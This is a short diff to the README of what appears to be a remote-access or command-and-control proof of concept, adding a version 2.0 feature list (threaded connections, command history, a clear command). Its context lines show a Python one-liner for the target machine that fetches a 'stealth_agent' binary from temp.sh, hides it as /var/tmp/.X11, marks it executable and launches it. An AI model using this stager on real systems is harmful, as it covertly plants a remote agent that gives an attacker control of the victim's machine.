@@ -76,6 +76,13 @@ Agent (Target machine) :
 
 - `python3 -c "import urllib.request,os,subprocess; u=urllib.request.Request('http://temp.sh/xxxx/stealth_agent',method='POST'); d='/var/tmp/.X11'; open(d,'wb').write(urllib.request.urlopen(u).read()); os.chmod(d,0o755); subprocess.Popen([d]);"`
 
+## Upgrades
+
+**Version 2.0**:
+* Support for multiple threaded connections.
+* Command history (using the "up" and "down" keys).
+* "Clear" command to avoid cluttering the screen.
+
 ## Contribution
 
 Feel free to make pull requests and contribute to the project, which is initially just a simple POC.
